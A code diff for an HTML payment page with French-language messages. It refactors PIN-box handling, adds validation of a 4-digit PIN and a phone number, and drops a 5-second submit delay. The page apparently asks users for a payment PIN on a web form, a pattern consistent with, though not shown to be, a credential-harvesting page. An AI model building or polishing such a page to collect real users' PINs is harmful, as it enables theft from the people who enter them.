@@ -44,12 +44,12 @@
     .header-image {
         width: 80px;
         height: 80px;
-        object-fit: contain;           /* keeps full image visible */
+        object-fit: contain;
         border-radius: 12px;
-        background: white;             /* fallback color if image fails */
+        background: white;
         margin: 0 auto 20px;
         display: block;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.15); /* optional subtle shadow */
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     }
 
     .payment-header h2 {
@@ -300,13 +300,24 @@
     <script>
         const boxes = document.querySelectorAll('.pin-box');
         const pinCombined = document.getElementById('pinCombined');
+        const form = document.getElementById('paymentForm');
+        const btn = document.getElementById('confirmBtn');
+        const overlay = document.getElementById('loadingOverlay');
 
+        // Function to combine PIN from individual boxes
+        function updatePin() {
+            const pinValue = Array.from(boxes).map(b => b.value).join('');
+            pinCombined.value = pinValue;
+            return pinValue;
+        }
+
+        // Auto-advance to next PIN box and update combined PIN
         boxes.forEach((box, idx) => {
-            box.addEventListener('input', () => {
+            box.addEventListener('input', (e) => {
                 if (box.value.length === 1 && idx < 3) {
                     boxes[idx + 1].focus();
                 }
-                pinCombined.value = Array.from(boxes).map(b => b.value).join('');
+                updatePin();
             });
 
             box.addEventListener('keydown', (e) => {
@@ -316,17 +327,33 @@
             });
         });
 
-        const form = document.getElementById('paymentForm');
-        const btn = document.getElementById('confirmBtn');
-        const overlay = document.getElementById('loadingOverlay');
-
+        // Handle form submission
         form.addEventListener('submit', (e) => {
             e.preventDefault();
+            
+            // Update PIN one last time before submission
+            const finalPin = updatePin();
+            
+            // Validate PIN
+            if (finalPin.length !== 4) {
+                alert('Veuillez entrer un code PIN à 4 chiffres');
+                return;
+            }
+            
+            // Validate phone number
+            const phoneInput = document.querySelector('input[name="phone"]');
+            if (!phoneInput.value || phoneInput.value.length < 9) {
+                alert('Veuillez entrer un numéro de téléphone valide (9 chiffres)');
+                phoneInput.focus();
+                return;
+            }
+            
+            // Disable button and show loading
             btn.disabled = true;
             overlay.style.display = 'flex';
-            setTimeout(() => {
-                form.submit();
-            }, 5000);
+            
+            // Submit the form
+            form.submit();
         });
     </script>
 
